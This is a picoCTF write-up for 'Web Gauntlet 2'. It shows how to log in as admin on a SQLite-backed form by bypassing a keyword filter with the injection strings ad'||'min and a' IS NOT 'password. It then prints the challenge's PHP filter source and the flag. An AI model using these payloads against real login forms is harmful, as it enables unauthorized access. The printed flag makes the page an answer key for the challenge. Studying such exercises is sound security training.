**Tristan Gomez**

# Web Gauntlet 2

### Author: MADSTACKS

### Description:

`
This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:21336/ Filter: http://mercury.picoctf.net:21336/filter.php
`

### Hints:
  * I tried to make it a little bit less contrived since the mini competition.
  * Each filter is separated by a space. Spaces are not filtered.
  * There is only 1 round this time, when you beat it the flag will be in filter.php.
  *  There is a length component now.
  *  sqlite


### filter.php

`Filters: or and true false union like = > < ; -- /* */ admin`


### Step 1

When visiting the challenge page, we are immediately greeted by a login form with `username` and `password` parameters. Entering `test:test` into the form and then clicking the `sign in` button will cause the page to display the sql query being ran.

```
SELECT username, password FROM users WHERE username='test' AND password='test'
```

### Step 2

With the query and filters being applied known, we can craft an exploit. Remember that we are using `sqlite` so that concatenation operator is `|`. This will allow us to enter `ad'||'min` as our username which will bypass the filters and be evaulated as `admin`.

Next, we need to see how we can bypass the password field. This is a trickier problem, but I hope you remember your operator precedence for sqlite! (I know I didn't!). If we use the `IS NOT` clause in our query then it will be evaluated before the password field is. Using the string below in the password field will bypass the password field.

```
a' IS NOT 'password
```

What's going on behind the scenes here is that `'a'` is being compared against `'password'` first. Since `'a' IS NOT 'password'` evaluates to true before the password field is checked, the password is evaluated as being true without ever really being checked. Isn't precedence cool!?(read as *confusing*). <br />

Upon entering our exploit strings, green text appears stating 
```
Congrats! You won! Check out filter.php
```

Clicking the filter.php link gives us the source for the challenge.

```
<?php
session_start();

if (!isset($_SESSION["winner2"])) {
    $_SESSION["winner2"] = 0;
}
$win = $_SESSION["winner2"];
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($win === 0) {
    $filter = array("or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin");
    if ($view) {
        echo "Filters: ".implode(" ", $filter)."<br/>";
    }
} else if ($win === 1) {
    if ($view) {
        highlight_file("filter.php");
    }
    $_SESSION["winner2"] = 0;        // <- Don't refresh!
} else {
    $_SESSION["winner2"] = 0;
}

// picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}
?>
```

**FLAG: picoCTF{0n3_m0r3_t1m3_838ec9084e6e0a65e4632329e7abc585}***
